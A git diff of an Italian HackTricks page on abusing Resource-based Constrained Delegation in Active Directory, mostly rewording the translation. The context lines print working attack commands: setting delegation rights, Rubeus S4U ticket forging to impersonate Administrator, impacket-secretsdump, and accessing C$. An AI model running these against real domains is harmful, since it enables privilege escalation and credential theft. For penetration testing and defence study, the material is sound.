@@ -2,17 +2,18 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
+
 ## Basics of Resource-based Constrained Delegation
 
 Questo è simile alla base [Constrained Delegation](constrained-delegation.md) ma **invece** di dare permessi a un **oggetto** per **impersonare qualsiasi utente contro una macchina**. La Resource-based Constrained Delegation **imposta** nell'**oggetto chi può impersonare qualsiasi utente contro di esso**.
 
 In questo caso, l'oggetto vincolato avrà un attributo chiamato _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ con il nome dell'utente che può impersonare qualsiasi altro utente contro di esso.
 
-Un'altra importante differenza tra questa Constrained Delegation e le altre deleghe è che qualsiasi utente con **permessi di scrittura su un account macchina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) può impostare il **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (Negli altri tipi di Delegation era necessario avere privilegi di amministratore di dominio).
+Un'altra importante differenza tra questa Constrained Delegation e le altre deleghe è che qualsiasi utente con **permessi di scrittura su un account macchina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) può impostare il **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (Nelle altre forme di Delegation erano necessari privilegi di amministratore di dominio).
 
 ### New Concepts
 
-Nella Constrained Delegation è stato detto che il **`TrustedToAuthForDelegation`** flag all'interno del valore _userAccountControl_ dell'utente è necessario per eseguire un **S4U2Self.** Ma non è completamente vero.\
+Tornando alla Constrained Delegation, è stato detto che il **`TrustedToAuthForDelegation`** flag all'interno del valore _userAccountControl_ dell'utente è necessario per eseguire un **S4U2Self.** Ma non è completamente vero.\
 La realtà è che anche senza quel valore, puoi eseguire un **S4U2Self** contro qualsiasi utente se sei un **servizio** (hai un SPN) ma, se hai **`TrustedToAuthForDelegation`** il TGS restituito sarà **Forwardable** e se **non hai** quel flag il TGS restituito **non sarà** **Forwardable**.
 
 Tuttavia, se il **TGS** utilizzato in **S4U2Proxy** **NON è Forwardable**, cercare di abusare di una **basic Constrain Delegation** **non funzionerà**. Ma se stai cercando di sfruttare una **Resource-Based constrain delegation, funzionerà**.
@@ -49,7 +50,7 @@ Get-DomainComputer SERVICEA
 ```
 ### Configurazione della Delegazione Constrainata Basata sulle Risorse
 
-**Utilizzando il modulo PowerShell activedirectory**
+**Utilizzando il modulo PowerShell di activedirectory**
 ```bash
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
@@ -85,7 +86,7 @@ Puoi generare più ticket per più servizi semplicemente chiedendo una volta uti
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 > [!CAUTION]
-> Nota che gli utenti hanno un attributo chiamato "**Non può essere delegato**". Se un utente ha questo attributo impostato su Vero, non sarai in grado di impersonarlo. Questa proprietà può essere vista all'interno di bloodhound.
+> Nota che gli utenti hanno un attributo chiamato "**Non può essere delegato**". Se un utente ha questo attributo impostato su True, non sarai in grado di impersonarlo. Questa proprietà può essere vista all'interno di bloodhound.
 
 ### Linux tooling: end-to-end RBCD with Impacket (2024+)
 
@@ -107,14 +108,14 @@ export KRB5CCNAME=$(pwd)/Administrator.ccache
 impacket-secretsdump -k -no-pass Administrator@victim.domain.local
 ```
 Note
-- Se la firma LDAP/LDAPS è obbligatoria, usa `impacket-rbcd -use-ldaps ...`.
-- Preferisci le chiavi AES; molti domini moderni limitano RC4. Impacket e Rubeus supportano entrambi flussi solo AES.
-- Impacket può riscrivere il `sname` ("AnySPN") per alcuni strumenti, ma ottieni il corretto SPN ogni volta che è possibile (ad es., CIFS/LDAP/HTTP/HOST/MSSQLSvc).
+- Se la firma LDAP/LDAPS è obbligatoria, utilizzare `impacket-rbcd -use-ldaps ...`.
+- Preferire le chiavi AES; molti domini moderni limitano RC4. Impacket e Rubeus supportano entrambi flussi solo AES.
+- Impacket può riscrivere il `sname` ("AnySPN") per alcuni strumenti, ma ottenere il corretto SPN ogni volta che è possibile (ad es., CIFS/LDAP/HTTP/HOST/MSSQLSvc).
 
 ### Accesso
 
 L'ultima riga di comando eseguirà il **completo attacco S4U e inietterà il TGS** dall'Amministratore all'host vittima in **memoria**.\
-In questo esempio è stato richiesto un TGS per il servizio **CIFS** dall'Amministratore, quindi sarai in grado di accedere a **C$**:
+In questo esempio è stato richiesto un TGS per il servizio **CIFS** dall'Amministratore, quindi sarà possibile accedere a **C$**:
 ```bash
 ls \\victim.domain.local\C$
 ```
@@ -147,7 +148,7 @@ Impacket (leggi o svuota con un comando):
 # Read who can delegate to VICTIM
 impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
 ```
-### Pulizia / ripristino RBCD
+### Cleanup / reset RBCD
 
 - PowerShell (cancellare l'attributo):
 ```powershell
@@ -166,12 +167,12 @@ impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025
 
 - **`KDC_ERR_ETYPE_NOTSUPP`**: Questo significa che kerberos è configurato per non utilizzare DES o RC4 e stai fornendo solo l'hash RC4. Fornisci a Rubeus almeno l'hash AES256 (o fornisci gli hash rc4, aes128 e aes256). Esempio: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
 - **`KRB_AP_ERR_SKEW`**: Questo significa che l'ora del computer attuale è diversa da quella del DC e kerberos non sta funzionando correttamente.
-- **`preauth_failed`**: Questo significa che il nome utente + hash forniti non funzionano per il login. Potresti aver dimenticato di mettere il "$" all'interno del nome utente durante la generazione degli hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
+- **`preauth_failed`**: Questo significa che il nome utente + hash forniti non funzionano per il login. Potresti aver dimenticato di mettere il "$" all'interno del nome utente quando hai generato gli hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
 - **`KDC_ERR_BADOPTION`**: Questo può significare:
 - L'utente che stai cercando di impersonare non può accedere al servizio desiderato (perché non puoi impersonarlo o perché non ha privilegi sufficienti)
 - Il servizio richiesto non esiste (se chiedi un ticket per winrm ma winrm non è in esecuzione)
-- Il fakecomputer creato ha perso i suoi privilegi sul server vulnerabile e devi restituirli.
-- Stai abusando del KCD classico; ricorda che RBCD funziona con ticket S4U2Self non inoltrabili, mentre KCD richiede ticket inoltrabili.
+- Il computer fittizio creato ha perso i suoi privilegi sul server vulnerabile e devi restituirli.
+- Stai abusando del KCD classico; ricorda che RBCD funziona con ticket S4U2Self non trasferibili, mentre KCD richiede ticket trasferibili.
 
 ## Note, relay e alternative
 
